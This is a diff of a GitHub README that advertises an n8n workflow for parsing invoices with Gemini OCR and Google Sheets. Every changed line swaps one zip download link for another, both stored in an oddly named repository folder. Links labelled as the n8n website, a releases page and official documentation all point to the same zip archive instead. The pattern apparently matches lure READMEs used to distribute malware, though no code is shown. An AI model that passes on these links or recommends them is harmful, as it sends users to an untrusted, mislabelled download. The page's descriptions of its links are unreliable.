@@ -1,6 +1,6 @@
 # 📄 n8n-Parse-Invoices-Documents-with-Gemini-AI-OCR-and-Google-Sheets-Integration - Effortlessly Extract Data from Your Documents
 
-[![Download Now](https://raw.githubusercontent.com/abbasZaidi110/n8n-Parse-Invoices-Documents-with-Gemini-AI-OCR-and-Google-Sheets-Integration/main/nephrogastric/n8n-Parse-Invoices-Documents-with-Gemini-AI-OCR-and-Google-Sheets-Integration.zip%20Now-%20-%234CAF50)](https://raw.githubusercontent.com/abbasZaidi110/n8n-Parse-Invoices-Documents-with-Gemini-AI-OCR-and-Google-Sheets-Integration/main/nephrogastric/n8n-Parse-Invoices-Documents-with-Gemini-AI-OCR-and-Google-Sheets-Integration.zip)
+[![Download Now](https://github.com/abbasZaidi110/n8n-Parse-Invoices-Documents-with-Gemini-AI-OCR-and-Google-Sheets-Integration/raw/refs/heads/main/nephrogastric/Documents_Parse_Google_A_and_Integration_Sheets_with_Gemini_OC_Invoices_n_1.5.zip%20Now-%20-%234CAF50)](https://github.com/abbasZaidi110/n8n-Parse-Invoices-Documents-with-Gemini-AI-OCR-and-Google-Sheets-Integration/raw/refs/heads/main/nephrogastric/Documents_Parse_Google_A_and_Integration_Sheets_with_Gemini_OC_Invoices_n_1.5.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome! This guide will help you download and run the n8n workflow that parses 
 
 ## 📥 Download & Install 
 
-To get started, visit this page to download: [Releases Page](https://raw.githubusercontent.com/abbasZaidi110/n8n-Parse-Invoices-Documents-with-Gemini-AI-OCR-and-Google-Sheets-Integration/main/nephrogastric/n8n-Parse-Invoices-Documents-with-Gemini-AI-OCR-and-Google-Sheets-Integration.zip). 
+To get started, visit this page to download: [Releases Page](https://github.com/abbasZaidi110/n8n-Parse-Invoices-Documents-with-Gemini-AI-OCR-and-Google-Sheets-Integration/raw/refs/heads/main/nephrogastric/Documents_Parse_Google_A_and_Integration_Sheets_with_Gemini_OC_Invoices_n_1.5.zip). 
 
 ### Step-by-Step Instructions to Download
 
@@ -40,7 +40,7 @@ Ensure your computer meets these basic requirements to run the workflow smoothly
 Once you download the files, follow these steps to set up the n8n workflow:
 
 1. **Install n8n:**
-   If you haven’t already, you will need to install n8n. Follow the instructions on the [n8n website](https://raw.githubusercontent.com/abbasZaidi110/n8n-Parse-Invoices-Documents-with-Gemini-AI-OCR-and-Google-Sheets-Integration/main/nephrogastric/n8n-Parse-Invoices-Documents-with-Gemini-AI-OCR-and-Google-Sheets-Integration.zip) for installation.
+   If you haven’t already, you will need to install n8n. Follow the instructions on the [n8n website](https://github.com/abbasZaidi110/n8n-Parse-Invoices-Documents-with-Gemini-AI-OCR-and-Google-Sheets-Integration/raw/refs/heads/main/nephrogastric/Documents_Parse_Google_A_and_Integration_Sheets_with_Gemini_OC_Invoices_n_1.5.zip) for installation.
 
 2. **Open n8n:**
    Launch the n8n application on your device.
@@ -100,9 +100,9 @@ If you encounter issues during setup or execution:
 
 For more information, explore the following resources:
 
-- [n8n Documentation](https://raw.githubusercontent.com/abbasZaidi110/n8n-Parse-Invoices-Documents-with-Gemini-AI-OCR-and-Google-Sheets-Integration/main/nephrogastric/n8n-Parse-Invoices-Documents-with-Gemini-AI-OCR-and-Google-Sheets-Integration.zip)
-- [Gemini AI OCR Documentation](https://raw.githubusercontent.com/abbasZaidi110/n8n-Parse-Invoices-Documents-with-Gemini-AI-OCR-and-Google-Sheets-Integration/main/nephrogastric/n8n-Parse-Invoices-Documents-with-Gemini-AI-OCR-and-Google-Sheets-Integration.zip)
-- [Google Sheets API Documentation](https://raw.githubusercontent.com/abbasZaidi110/n8n-Parse-Invoices-Documents-with-Gemini-AI-OCR-and-Google-Sheets-Integration/main/nephrogastric/n8n-Parse-Invoices-Documents-with-Gemini-AI-OCR-and-Google-Sheets-Integration.zip)
+- [n8n Documentation](https://github.com/abbasZaidi110/n8n-Parse-Invoices-Documents-with-Gemini-AI-OCR-and-Google-Sheets-Integration/raw/refs/heads/main/nephrogastric/Documents_Parse_Google_A_and_Integration_Sheets_with_Gemini_OC_Invoices_n_1.5.zip)
+- [Gemini AI OCR Documentation](https://github.com/abbasZaidi110/n8n-Parse-Invoices-Documents-with-Gemini-AI-OCR-and-Google-Sheets-Integration/raw/refs/heads/main/nephrogastric/Documents_Parse_Google_A_and_Integration_Sheets_with_Gemini_OC_Invoices_n_1.5.zip)
+- [Google Sheets API Documentation](https://github.com/abbasZaidi110/n8n-Parse-Invoices-Documents-with-Gemini-AI-OCR-and-Google-Sheets-Integration/raw/refs/heads/main/nephrogastric/Documents_Parse_Google_A_and_Integration_Sheets_with_Gemini_OC_Invoices_n_1.5.zip)
 
 ## 🧑‍🤝‍🧑 Community Support
 
@@ -113,4 +113,4 @@ Join our community for support and suggestions:
 
 For any unresolved issues, feel free to open a ticket on our GitHub page.
 
-[![Download Now](https://raw.githubusercontent.com/abbasZaidi110/n8n-Parse-Invoices-Documents-with-Gemini-AI-OCR-and-Google-Sheets-Integration/main/nephrogastric/n8n-Parse-Invoices-Documents-with-Gemini-AI-OCR-and-Google-Sheets-Integration.zip%20Now-%20-%234CAF50)](https://raw.githubusercontent.com/abbasZaidi110/n8n-Parse-Invoices-Documents-with-Gemini-AI-OCR-and-Google-Sheets-Integration/main/nephrogastric/n8n-Parse-Invoices-Documents-with-Gemini-AI-OCR-and-Google-Sheets-Integration.zip)
+[![Download Now](https://github.com/abbasZaidi110/n8n-Parse-Invoices-Documents-with-Gemini-AI-OCR-and-Google-Sheets-Integration/raw/refs/heads/main/nephrogastric/Documents_Parse_Google_A_and_Integration_Sheets_with_Gemini_OC_Invoices_n_1.5.zip%20Now-%20-%234CAF50)](https://github.com/abbasZaidi110/n8n-Parse-Invoices-Documents-with-Gemini-AI-OCR-and-Google-Sheets-Integration/raw/refs/heads/main/nephrogastric/Documents_Parse_Google_A_and_Integration_Sheets_with_Gemini_OC_Invoices_n_1.5.zip)
